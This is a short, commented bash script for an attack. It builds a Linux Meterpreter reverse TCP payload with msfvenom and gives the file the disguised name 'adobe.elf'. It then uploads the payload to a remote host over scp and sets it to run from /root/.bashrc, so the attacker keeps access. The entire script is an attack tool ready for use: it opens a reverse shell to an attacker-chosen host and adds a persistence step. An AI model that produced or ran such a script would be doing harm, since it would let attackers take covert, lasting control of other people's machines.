#!/bin/bash

# Prompt the user for LHOST and LPORT
read -p "Enter LHOST: " LHOST
read -p "Enter LPORT: " LPORT

# Generate a Meterpreter reverse TCP payload with msfvenom
# The payload is configured with the provided LHOST and LPORT
# The '-f elf' option specifies that the payload should be in the ELF binary format
# The output is written to a file named 'adobe.elf'
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o adobe.elf

# Prompt the user for SSH username, host, and the upload path
read -p "Enter SSH username: " user
read -p "Enter SSH host: " host
read -p "Enter SSH upload path: " path

# Upload the payload to the SSH server
# The 'scp' command is used to copy the file over SSH
# The file 'adobe.elf' is copied to the specified path on the host
scp adobe.elf $user@$host:$path

# Add the command to execute the payload to the .bashrc file of the root user
# This is done by SSHing into the host and running the echo command to append the line to .bashrc
# The 'chmod +x' command makes the payload executable
# The SSH connection is left open by running 'bash' at the end
ssh -tt $user@$host "chmod +x $path/adobe.elf; echo '$path/adobe.elf' >> /root/.bashrc; bash"

# End the script
exit 0

